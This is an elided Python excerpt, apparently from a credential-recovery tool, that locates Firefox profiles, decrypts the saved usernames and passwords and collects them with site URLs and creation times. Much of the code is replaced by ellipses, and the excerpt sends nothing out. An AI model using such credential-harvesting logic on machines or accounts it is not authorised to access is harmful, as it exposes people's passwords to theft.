...
from xdsmoc.config.crypto.pyDes import triple_des, CBC
from xdsmoc.config.dico import get_dic
from xdsmoc.config.module_info import ModuleInfo
from xdsmoc.config.winstructure import char_to_int, convert_to_byte, python_version
    ...
    def get_login_data(self, profile):
        ...
        try:
            ...
            for row in json_logins['logins']:
                ...
                create_time = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(row['timeCreated']/1000))
                logins.append((self.decode_login_data(enc_username),
                               self.decode_login_data(enc_password), row['hostname'], create_time))
            return logins
        ...
        if os.path.exists(self.path):
            for profile in self.get_firefox_profiles(self.path):
                ...
                for key in self.get_key(profile):
                    ...
                    for user, passw, url, create_time in credentials:
                        try:
                            pwd_found.append({
                                'URL': url,
